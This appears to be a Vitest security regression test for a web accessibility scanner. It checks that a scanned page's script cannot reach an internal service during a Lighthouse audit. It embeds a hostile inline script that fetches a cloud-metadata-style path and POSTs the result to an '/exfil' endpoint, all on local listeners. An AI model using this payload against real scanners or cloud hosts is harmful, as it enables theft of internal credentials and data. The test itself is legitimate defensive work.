/**
 * Security regression test: the scanned page's JavaScript must not reach an internal service
 * while Lighthouse audits it. Lighthouse opens its own page in the shared Chromium, outside
 * the capture stage's context guard, so only the browser-level guard covers it.
 *
 * Needs real Chromium and two 127.0.0.1 listeners, no external network:
 *   A11YHAWK_BROWSER_TEST=1 npx vitest run src/engine/lighthouse-egress.security.test.ts
 *
 * Node's DNS is mocked so `scan-target.test` validates as public, and Chromium maps that name
 * to the local target with --host-resolver-rules. The "internal service" is a second
 * 127.0.0.1 listener standing in for 169.254.169.254 or an RFC 1918 host.
 */
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { chromium } from 'playwright';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('dns/promises', () => ({
  resolve4: async () => ['93.184.216.34'],
  resolve6: async () => {
    throw Object.assign(new Error('ENODATA'), { code: 'ENODATA' });
  },
  lookup: async () => [{ address: '93.184.216.34', family: 4 }],
}));

import type { Logger } from '../logger/index.js';
import { scan } from './scan.js';

const CANARY = 'CANARY-INTERNAL-SERVICE-BODY-5150';

describe.runIf(process.env.A11YHAWK_BROWSER_TEST === '1')('Lighthouse stage egress', () => {
  let internal: Server;
  let target: Server;
  let internalHits = 0;
  let exfiltrated: string[] = [];
  let lighthouseBeacons = 0;
  let stage: 'capture' | 'lighthouse' = 'capture';
  let extraArgs: string[] = [];

  // Flips the stage when the engine starts the audit, so beacons can be attributed to it.
  const logger: Logger = {
    debug() {},
    info(message) {
      if (message === 'Lighthouse audit starting') stage = 'lighthouse';
    },
    warn() {},
    error() {},
    child() {
      return logger;
    },
    async flush() {},
  };

  beforeAll(async () => {
    internal = createServer((_req, res) => {
      internalHits += 1;
      res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
      res.end(CANARY);
    });
    await new Promise<void>((resolve) => internal.listen(0, '127.0.0.1', resolve));
    const internalPort = (internal.address() as AddressInfo).port;

    target = createServer((req, res) => {
      if (req.url === '/beacon') {
        if (stage === 'lighthouse') lighthouseBeacons += 1;
        res.writeHead(204).end();
        return;
      }
      if (req.method === 'POST' && req.url === '/exfil') {
        let body = '';
        req.on('data', (chunk: Buffer) => (body += chunk.toString()));
        req.on('end', () => {
          exfiltrated.push(body);
          res.writeHead(204).end();
        });
        return;
      }
      res.writeHead(200, { 'content-type': 'text/html' });
      // The same-origin beacon proves the script ran, so a pass cannot come from a page
      // that never executed.
      res.end(`<!doctype html><html lang="en"><head><title>Hostile</title></head><body><main><h1>Hostile</h1>
<script>
fetch('/beacon').catch(() => {});
fetch('http://127.0.0.1:${internalPort}/latest/meta-data/')
  .then((r) => r.text())
  .then((t) => fetch('/exfil', { method: 'POST', body: t }))
  .catch(() => {});
</script></main></body></html>`);
    });
    await new Promise<void>((resolve) => target.listen(0, '127.0.0.1', resolve));

    // Chromium (and Lighthouse, which reuses it over CDP) resolves the "public" hostname to
    // the local target.
    const launchServer = chromium.launchServer.bind(chromium);
    vi.spyOn(chromium, 'launchServer').mockImplementation((options) =>
      launchServer({
        ...options,
        args: [...(options?.args ?? []), '--host-resolver-rules=MAP scan-target.test 127.0.0.1', ...extraArgs],
      }),
    );
  });

  beforeEach(() => {
    internalHits = 0;
    exfiltrated = [];
    lighthouseBeacons = 0;
    stage = 'capture';
    extraArgs = [];
  });

  afterAll(async () => {
    vi.restoreAllMocks();
    await new Promise((resolve) => internal.close(resolve));
    await new Promise((resolve) => target.close(resolve));
  });

  async function runScan(): Promise<void> {
    const targetPort = (target.address() as AddressInfo).port;
    await scan(`http://scan-target.test:${targetPort}/`, {
      lighthouse: true,
      screenshot: false,
      annotate: false,
      logger,
    });
  }

  it('blocks the fetch when the page is on loopback, where Local Network Access does not apply', async () => {
    await runScan();

    expect(lighthouseBeacons).toBeGreaterThan(0);
    expect(internalHits).toBe(0);
    expect(exfiltrated.join('')).not.toContain(CANARY);
  }, 180_000);

  it('blocks the fetch when Chromium treats the page as public', async () => {
    const targetPort = (target.address() as AddressInfo).port;
    extraArgs = [`--ip-address-space-overrides=127.0.0.1:${targetPort}=public`];

    await runScan();

    expect(lighthouseBeacons).toBeGreaterThan(0);
    expect(internalHits).toBe(0);
    expect(exfiltrated.join('')).not.toContain(CANARY);
  }, 180_000);
});
